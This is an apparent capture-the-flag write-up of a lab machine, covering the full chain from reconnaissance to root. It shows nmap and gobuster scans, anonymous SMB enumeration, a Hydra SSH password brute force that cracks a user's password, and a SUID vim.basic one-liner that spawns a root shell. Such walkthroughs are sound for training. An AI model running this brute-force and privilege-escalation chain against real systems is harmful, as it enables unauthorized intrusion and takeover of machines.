ip=10.10.248.82

## Scanning and Enum:

    		Command used: nmap -A -T4 -p- $ip -v -oN nmap/initial
    		Results:

    	    PORT     STATE SERVICE     VERSION

    		22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
    		| ssh-hostkey:
    		| 2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
    		| 256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
    		|_ 256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
    		80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
    		|\_http-server-header: Apache/2.4.18 (Ubuntu)
    		|\_http-title: Site doesn't have a title (text/html).
    		| http-methods:
    		|_ Supported Methods: GET HEAD POST OPTIONS
    		139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    		445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
    		8009/tcp open ajp13 Apache Jserv (Protocol v1.3)
    		| ajp-methods:
    		|\_ Supported methods: GET HEAD POST OPTIONS
    		8080/tcp open http Apache Tomcat 9.0.7

# enumerating smb shares using smbclient

    1st command:
    	- smbclient -L \\\\10.10.248.82\\ -N

    	This Listed the shares on the machine 1)IPC$
    										  2)Anonymous

    2nd Command:
    	- smbclient \\\\10.10.248.82\\Anonymous -N
    	- get staff.txt => Two usernames => kay and jan

# Enumerating web apps=>

    	 Information Disclosure => Apache/2.4.18 (Ubuntu) Server at 10.10.248.82 Port 80
    Directory Busting=>
    	 gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.248.82

## Results:

    	 Gobuster v3.1.0
    	 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    	 ===============================================================
    	 [+] Url:                     http://10.10.248.82
    	 [+] Method:                  GET
    	 [+] Threads:                 50
    	 [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    	 [+] Negative Status codes:   404
    	 [+] User Agent:              gobuster/3.1.0
    	 [+] Timeout:                 10s
    	 ===============================================================
    	 2022/06/08 03:41:37 Starting gobuster in directory enumeration mode
    	 ===============================================================
    	 /development          (Status: 301) [Size: 318] [--> http://10.10.248.82/development/]
    	 /server-status        (Status: 403) [Size: 300]

So i went to 10.10.248.82/development And i found out that jan had a weak password.

## Therefore Now enter HYDRA

    		=> hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.248.82

    		Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these \*\*\* ignore laws and ethics anyway).

    		Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-08 03:43:19
    		[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
    		[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
    		[DATA] attacking ssh://10.10.248.82:22/
    		[STATUS] 176.00 tries/min, 176 tries in 00:01h, 14344223 to do in 1358:22h, 16 active
    		[STATUS] 112.67 tries/min, 338 tries in 00:03h, 14344061 to do in 2121:55h, 16 active

    		[22][ssh] host: 10.10.248.82 login: jan password: armando

    		1 of 1 target successfully completed, 1 valid password found
    		Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-08 03:50:12

    		now to connect to local user jan:

    		=> ssh jan@10.10.248.82

## Privilege Escalation

    		1 => Looked for kernel Exploits
    		2 => Suid files => /usr/bin/vim.basic
            > find / -perm /4000 2>/dev/null


    		used the suid file to gain root
    		command => /usr/bin/vim.basic -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

